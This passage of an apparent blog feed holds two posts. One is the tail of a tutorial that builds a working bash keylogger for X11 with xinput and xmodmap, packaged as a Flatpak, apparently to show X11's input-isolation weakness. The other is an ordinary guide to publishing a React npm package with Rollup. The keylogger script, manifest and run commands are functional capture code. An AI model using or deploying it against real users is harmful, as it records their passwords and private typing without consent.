href="#2-Create-a-script-named-as-keylogger-sh" class="headerlink" title="2. Create a script named as keylogger.sh"></a>2. Create a script named as keylogger.sh</h3><p>The script sets up a keylogger by capturing key input events, modifying them to replace key codes with their corresponding key values, and storing the modified events in a file.<br>Let‚Äôs go through the main parts of the code:</p><p><strong><code>trap_commands()</code></strong>: This is a function that defines the actions to be taken when the script receives a <code>SIGINT</code> signal, which is generated when the script is interrupted with <code>^C</code>. This function reads key mapping data from <code>/tmp/keylogger_keyboard.txt</code> and key input events from <code>/tmp/keylogger_output.txt</code>. It then uses this data to replace key codes with their corresponding key values in the input events, and writes the modified events to <code>/tmp/keylogger_final_output.txt</code>. Finally, the function prints ‚ÄúFinished‚Äù and exits with a status code of 0.</p><p><strong><code>trap &#39;trap_commands&#39; SIGINT</code></strong>: This registers the <code>trap_commands</code> function to be executed when the script receives a <code>SIGINT</code> signal.</p><p><strong><code>xmodmap -pke &gt; /tmp/keylogger_keyboard.txt</code></strong>: This command generates a list of key mappings using xmodmap and writes the output to <code>/tmp/keylogger_keyboard.txt</code>. This file contains the mapping between key codes and their corresponding key values.</p><p><strong><code>xinput test $(xinput list | grep &#39;Keyboard Name&#39; | sed &#39;s/.*id=\([0-9]*\).*/\1/&#39;) &gt; /tmp/keylogger_output.txt</code></strong>: This command captures key input events using xinput and writes the output to <code>/tmp/keylogger_output.txt</code>. This file contains the raw key input events that will be processed by the script.<br>Find the name of your keyboard by the list of <code>libinput list-devices</code>, then replace ‚ÄòKeyboard Name‚Äô with your keyboard name.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hide terminal output for ^C</span></span><br><span class="line"><span class="built_in">stty</span> -echoctl</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define trap function to execute on SIGINT</span></span><br><span class="line"><span class="function"><span class="title">trap_commands</span></span> () &#123;</span><br><span class="line">    <span class="built_in">declare</span> -A animals</span><br><span class="line">    animals=([<span class="string">&quot;None&quot;</span>]=<span class="string">&quot;None&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;animals[None]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> p; <span class="keyword">do</span></span><br><span class="line">        key_id=$(<span class="built_in">echo</span> <span class="variable">$p</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f2)</span><br><span class="line">        key_value=$(<span class="built_in">echo</span> <span class="variable">$p</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f4)</span><br><span class="line">        animals[<span class="string">&quot;<span class="variable">$key_id</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$key_value</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span> &lt;/tmp/keylogger_keyboard.txt</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;new record start...&quot;</span> &gt; /tmp/keylogger_final_output.txt</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> q; <span class="keyword">do</span></span><br><span class="line">        key_id=$(<span class="built_in">echo</span> <span class="variable">$q</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f3)</span><br><span class="line">        <span class="keyword">if</span> [[ -v <span class="string">&quot;animals[<span class="variable">$key_id</span>]&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            new_value=<span class="string">&quot;<span class="variable">$&#123;animals[$key_id]&#125;</span>&quot;</span></span><br><span class="line">            (<span class="built_in">echo</span> <span class="variable">$q</span> | sed <span class="string">&quot;s/<span class="variable">$key_id</span>/<span class="variable">$new_value</span>/&quot;</span>) &gt;&gt; /tmp/keylogger_final_output.txt</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span> &lt;/tmp/keylogger_output.txt</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\rFinished. &quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Register trap function with SIGINT signal</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&#x27;trap_commands&#x27;</span> SIGINT</span><br><span class="line"></span><br><span class="line"><span class="comment"># Record key presses with xinput and xmodmap</span></span><br><span class="line">xmodmap -pke &gt; /tmp/keylogger_keyboard.txt</span><br><span class="line">xinput <span class="built_in">test</span> $(xinput list | grep <span class="string">&#x27;Keyboard Name&#x27;</span> | sed <span class="string">&#x27;s/.*id=\([0-9]*\).*/\1/&#x27;</span>) &gt; /tmp/keylogger_output.txt</span><br></pre></td></tr></table></figure><h3 id="3-Add-a-manifest-named-org-flatpak-keylogger-yml"><a href="#3-Add-a-manifest-named-org-flatpak-keylogger-yml" class="headerlink" title="3. Add a manifest named org.flatpak.keylogger.yml"></a>3. Add a manifest named org.flatpak.keylogger.yml</h3><p>The building process includes three modules: ‚Äúkeylogger‚Äù, ‚Äúxinput‚Äù, and ‚Äúxmodmap‚Äù. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">app-id: org.flatpak.keylogger</span><br><span class="line">runtime: org.freedesktop.Platform</span><br><span class="line">runtime-version: <span class="string">&#x27;22.08&#x27;</span></span><br><span class="line">sdk: org.freedesktop.Sdk</span><br><span class="line"><span class="built_in">command</span>: keylogger.sh</span><br><span class="line">modules:</span><br><span class="line">  - name: keylogger</span><br><span class="line">    buildsystem: simple</span><br><span class="line">    build-commands:</span><br><span class="line">      - install -D keylogger.sh /app/bin/keylogger.sh</span><br><span class="line">    sources:</span><br><span class="line">      - <span class="built_in">type</span>: file</span><br><span class="line">        path: keylogger.sh</span><br><span class="line">  - name: xinput</span><br><span class="line">    buildsystem: autotools</span><br><span class="line">    build-commands:</span><br><span class="line">      - make</span><br><span class="line">      - make install</span><br><span class="line">    sources:</span><br><span class="line">      - <span class="built_in">type</span>: git</span><br><span class="line">        url: https://github.com/freedesktop/xorg-xinput.git</span><br><span class="line">  - name: xmodmap</span><br><span class="line">    buildsystem: autotools</span><br><span class="line">    build-commands:</span><br><span class="line">      - make</span><br><span class="line">      - make install</span><br><span class="line">    sources:</span><br><span class="line">      - <span class="built_in">type</span>: git</span><br><span class="line">        url: https://github.com/freedesktop/xmodmap.git</span><br></pre></td></tr></table></figure><h3 id="4-Build-the-application"><a href="#4-Build-the-application" class="headerlink" title="4. Build the application"></a>4. Build the application</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flatpak-builder build-dir org.flatpak.keylogger.yml</span><br></pre></td></tr></table></figure><p>Your file structure of <code>org.flatpak.keylogger</code> should look like this:<br><img src="https://s2.loli.net/2023/04/13/xGOQMofyZPzKgI4.png" alt="file.png"></p><h3 id="5-Test-the-build"><a href="#5-Test-the-build" class="headerlink" title="5. Test the build"></a>5. Test the build</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flatpak-builder --user --install --force-clean build-dir org.flatpak.keylogger.yml</span><br><span class="line">flatpak run --socket=x11 --filesystem=/tmp org.flatpak.keylogger</span><br></pre></td></tr></table></figure><h2 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h2><h3 id="What-I-type-in-terminal"><a href="#What-I-type-in-terminal" class="headerlink" title="What I type in terminal"></a>What I type in terminal</h3><p><img src="https://s2.loli.net/2023/04/13/orqhtu168pRXyHP.png" alt="type-in.png"></p><h3 id="The-mapping-of-keyboard-keylogger-keyboard-txt"><a href="#The-mapping-of-keyboard-keylogger-keyboard-txt" class="headerlink" title="The mapping of keyboard: keylogger_keyboard.txt"></a>The mapping of keyboard: keylogger_keyboard.txt</h3><p><img src="https://s2.loli.net/2023/04/13/SimbBKaNyC6efxk.png" alt="keylogger_keyboard.png"></p><h3 id="The-original-keyboard-input-keylogger-output-txt"><a href="#The-original-keyboard-input-keylogger-output-txt" class="headerlink" title="The original keyboard input: keylogger_output.txt"></a>The original keyboard input: keylogger_output.txt</h3><p><img src="https://s2.loli.net/2023/04/13/fOFU8LcgtdQuMS9.png" alt="keylogger_output.png"></p><h3 id="The-keyboard-input-after-mapping-keylogger-final-output-txt"><a href="#The-keyboard-input-after-mapping-keylogger-final-output-txt" class="headerlink" title="The keyboard input after mapping: keylogger_final_output.txt"></a>The keyboard input after mapping: keylogger_final_output.txt</h3><p><img src="https://s2.loli.net/2023/04/13/RZfgD6ri2jzvsFk.png" alt="keylogger_final_output.png"></p><hr><p>References:</p><ul><li><a href="https://docs.flatpak.org/en/latest/first-build.html">https://docs.flatpak.org/en/latest/first-build.html</a></li><li><a href="http://techtrickery.com/keyloggers.html">http://techtrickery.com/keyloggers.html</a></li></ul><p>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#98;&#115;&#x75;&#53;&#64;&#x6e;&#99;&#115;&#117;&#46;&#101;&#100;&#x75;">&#98;&#115;&#x75;&#53;&#64;&#x6e;&#99;&#115;&#117;&#46;&#101;&#100;&#x75;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;X11 has been a widely used windowing system on Unix platforms for decades, but its security vulnerabilities have become increasingly appa</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    
    <category term="Linux" scheme="https://beking0912.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>üì¶ Publish React npm Package with Rollup</title>
    <link href="https://beking0912.github.io/2023/02/06/Quickstart-with-Rollup/"/>
    <id>https://beking0912.github.io/2023/02/06/Quickstart-with-Rollup/</id>
    <published>2023-02-06T17:11:37.000Z</published>
    <updated>2023-02-19T19:16:13.952Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/02/18/ojxUeXibkZClKzt.png" alt="rollup-typescript _2_.png"></p><p>In this tutorial, I‚Äôll walk you through my own process of using Rollup, a popular bundler, to create a React component package, enabling others to easily integrate your components into their projects. </p><h2 id="Initialize-the-repo"><a href="#Initialize-the-repo" class="headerlink" title="Initialize the repo"></a>Initialize the repo</h2><p>Create a new directory called <em><strong>react-lib</strong></em> and initialize a new npm project within it, allowing you to install and manage dependencies for a React library.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> react-lib</span><br><span class="line"><span class="built_in">cd</span> react-lib</span><br><span class="line">npm init</span><br></pre></td></tr></table></figure><h2 id="Add-dependencies"><a href="#Add-dependencies" class="headerlink" title="Add dependencies"></a>Add dependencies</h2><p>Add dependencies we need. And <strong><a href="https://styled-components.com/docs/">Styled-components</a></strong> is a CSS-in-JS library that allows to write CSS in JavaScript code. It provides a powerful API for building reusable and dynamic styled components in React applications. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i -D react typescript @types/react</span><br><span class="line">npm i --save styled-components</span><br></pre></td></tr></table></figure><h2 id="TypeScript-configuration"><a href="#TypeScript-configuration" class="headerlink" title="TypeScript configuration"></a>TypeScript configuration</h2><p>Initialize a TypeScript project by creating a <em><strong>tsconfig.json</strong></em> file which specifies how TypeScript should compile the project‚Äôs source files.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx tsc --init</span><br></pre></td></tr></table></figure><p>This is an example for <em><strong>tsconfig.json</strong></em>.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;es5&quot;</span><span class="punctuation">,</span>                                <span class="comment">/* Specify ECMAScript target version: &#x27;ES3&#x27; (default), &#x27;ES5&#x27;, &#x27;ES2015&#x27;, &#x27;ES2016&#x27;, &#x27;ES2017&#x27;, &#x27;ES2018&#x27;, &#x27;ES2019&#x27;, &#x27;ES2020&#x27;, or &#x27;ESNEXT&#x27;. */</span></span><br><span class="line">    <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;esnext&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;jsx&quot;</span><span class="punctuation">:</span> <span class="string">&quot;react&quot;</span><span class="punctuation">,</span>                                <span class="comment">/* Specify what JSX code is generated. */</span></span><br><span class="line">    <span class="attr">&quot;moduleResolution&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span>                       <span class="comment">/* Specify how TypeScript looks up a file from a given module specifier. */</span></span><br><span class="line">    <span class="attr">&quot;allowJs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>                                  <span class="comment">/* Allow JavaScript files to be a part of your program. Use the &#x27;checkJS&#x27; option to get errors from these files. */</span></span><br><span class="line">    <span class="attr">&quot;outDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./types&quot;</span><span class="punctuation">,</span>                                     <span class="comment">/* Specify an output folder for all emitted files. */</span></span><br><span class="line">    <span class="attr">&quot;allowSyntheticDefaultImports&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>             <span class="comment">/* Allow &#x27;import x from y&#x27; when a module doesn&#x27;t have a default export. */</span></span><br><span class="line">    <span class="attr">&quot;esModuleInterop&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>                             <span class="comment">/* Emit additional JavaScript to ease support for importing CommonJS modules. This enables &#x27;allowSyntheticDefaultImports&#x27; for type compatibility. */</span></span><br><span class="line">    <span class="attr">&quot;forceConsistentCasingInFileNames&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>            <span class="comment">/* Ensure that casing is correct in imports. */</span></span><br><span class="line">    <span class="attr">&quot;strict&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>                                      <span class="comment">/* Enable all strict type-checking options. */</span></span><br><span class="line">    <span class="attr">&quot;skipLibCheck&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span>                                 <span class="comment">/* Skip type checking all .d.ts files. */</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;include&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;src&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;test&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ESLint-configuration"><a href="#ESLint-configuration" class="headerlink" title="ESLint configuration"></a>ESLint configuration</h2><p><strong>ESLint</strong> is a popular linting tool for JavaScript that helps catch common errors and enforce coding standards, and it can also be configured to catch specific coding issues, such as incorrect syntax or anti-patterns, saving time and prevent bugs from slipping through the cracks.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i eslint -D </span><br><span class="line">npx eslint --init</span><br></pre></td></tr></table></figure><p>Create <em><strong>.eslintignore</strong></em> to exclude certain files from ESLint checks.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test/**</span><br><span class="line">lib/**</span><br><span class="line">types/**</span><br></pre></td></tr></table></figure><h2 id="Add-gitignore"><a href="#Add-gitignore" class="headerlink" title="Add .gitignore"></a>Add .gitignore</h2><p>Create <em><strong>.gitignore</strong></em> to exclude certain files from git push.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/node_modules</span><br><span class="line">/types</span><br><span class="line">/lib</span><br></pre></td></tr></table></figure><h2 id="Adding-components"><a href="#Adding-components" class="headerlink" title="Adding components"></a>Adding components</h2><p>Write and export your custom component code in the src folder. And here is an example in TypeScript.</p><ul><li><p>src&#x2F;components&#x2F;Sum&#x2F;index.tsx</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">SumProps</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./Sum.types&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">StyledSum</span> <span class="keyword">from</span> <span class="string">&quot;./styles&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Sum</span>: <span class="title class_">React</span>.<span class="property">FC</span>&lt;<span class="title class_">SumProps</span>&gt; = <span class="function">(<span class="params">&#123; a, b &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> sum = a + b;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">StyledSum</span>&gt;</span>&#123;a&#125; + &#123;b&#125; = &#123;sum&#125;<span class="tag">&lt;/<span class="name">StyledSum</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Sum</span>;</span><br></pre></td></tr></table></figure></li><li><p>src&#x2F;components&#x2F;Sum&#x2F;Sum.types.ts</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> type <span class="title class_">SumProps</span> = &#123;</span><br><span class="line">  <span class="attr">a</span>: number;</span><br><span class="line">  <span class="attr">b</span>: number;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>src&#x2F;components&#x2F;Sum&#x2F;styles.tsx</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> styled <span class="keyword">from</span> <span class="string">&#x27;styled-components&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">StyledSum</span> = styled.<span class="property">div</span><span class="string">`</span></span><br><span class="line"><span class="string">    display: flex;</span></span><br><span class="line"><span class="string">    align-items: center;</span></span><br><span class="line"><span class="string">    justify-content: center;</span></span><br><span class="line"><span class="string">    font-size: 1.2rem;</span></span><br><span class="line"><span class="string">    font-weight: bold;</span></span><br><span class="line"><span class="string">    padding: 10px;</span></span><br><span class="line"><span class="string">    background-color: #f2f2f2;</span></span><br><span class="line"><span class="string">    border: 1px solid #ccc;</span></span><br><span class="line"><span class="string">    border-radius: 5px;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">StyledSum</span>;</span><br></pre></td></tr></table></figure></li><li><p>src&#x2F;components&#x2F;index.ts</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> <span class="title class_">Sum</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./Sum&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>src&#x2F;index.ts</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">&#x27;./components&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Rollup-configuration"><a href="#Rollup-configuration" class="headerlink" title="Rollup configuration"></a>Rollup configuration</h2><p><strong><a href="https://rollupjs.org/">Rollup</a></strong> is a module bundler that allows to package your code into modules, making it easier to share and distribute code. It creates a single file from multiple ES6 modules, resulting in smaller output files with faster loading times, and makes it particularly useful for creating libraries and packages, and can improve web application load times, especially on mobile devices.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D rollup</span><br></pre></td></tr></table></figure><h3 id="Why-Rollup"><a href="#Why-Rollup" class="headerlink" title="Why Rollup"></a>Why Rollup</h3><ul><li>Rollup uses the ES6 standard format to bundle code.</li><li>It only bundles JavaScript, which makes it fast and generates small bundle sizes.</li><li>It has algorithmic advantages in handling pure code and is suitable for developing JavaScript libraries, it can also be used for bundling application development.</li></ul><h3 id="Why-not"><a href="#Why-not" class="headerlink" title="Why not"></a>Why not</h3><ul><li>When code splitting is needed, and Rollup does not support code splitting.</li><li>If there are many static resources that need to be processed, and the module structure is complex.</li><li>If the project being built requires many dependencies on CommonJS modules.</li></ul><h3 id="Packages"><a href="#Packages" class="headerlink" title="Packages"></a>Packages</h3><ul><li><strong>@rollup&#x2F;plugin-node-resolve</strong>: enables to use external libraries and modules. Rollup does not support directly bundling the contents of the node_modules folder, so it needs to be installed.</li><li><strong>@rollup&#x2F;plugin-commonjs</strong>: converts CommonJS modules to ES6 modules, enables to use modules that were not designed for ES6 module syntax. Lodash is not bundled by default as it uses CommonJS and Rollup only processes ES modules, but this package can solve the problem of CommonJS exports and ES module imports.</li><li><strong>@rollup&#x2F;plugin-typescript</strong>: compiles TypeScript files into JavaScript code.</li></ul><p>And this is my <em><strong>rollup.config.js</strong></em>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> resolve <span class="keyword">from</span> <span class="string">&quot;@rollup/plugin-node-resolve&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> commonjs <span class="keyword">from</span> <span class="string">&quot;@rollup/plugin-commonjs&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> typescript <span class="keyword">from</span> <span class="string">&quot;@rollup/plugin-typescript&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">input</span>: <span class="string">&quot;src/index.ts&quot;</span>,</span><br><span class="line">  <span class="attr">external</span>: [<span class="string">&#x27;react&#x27;</span>],</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="title function_">typescript</span>(),</span><br><span class="line">    <span class="title function_">commonjs</span>(),</span><br><span class="line">    <span class="title function_">resolve</span>()</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">output</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">file</span>: <span class="string">&quot;lib/bundle.cjs.js&quot;</span>,</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&#x27;cjs&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">file</span>: <span class="string">&quot;lib/bundle.esm.js&quot;</span>,</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&#x27;esm&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">file</span>: <span class="string">&quot;lib/bundle.browser.js&quot;</span>,</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&#x27;umd&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;Dry&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Add new scripts commands <em><strong>build</strong></em> and <em><strong>build:types</strong></em> to the <em><strong>package.json</strong></em> file. </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;@bk/sum&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A react component that sum two numbers.&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;repository&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@github.com:Beking0912/react-typescript-rollup-starter.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lib/bundle.cjs.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lib/bundle.esm.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;browser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lib/bundle.browser.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;types&quot;</span><span class="punctuation">:</span> <span class="string">&quot;types/index.d.ts&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span 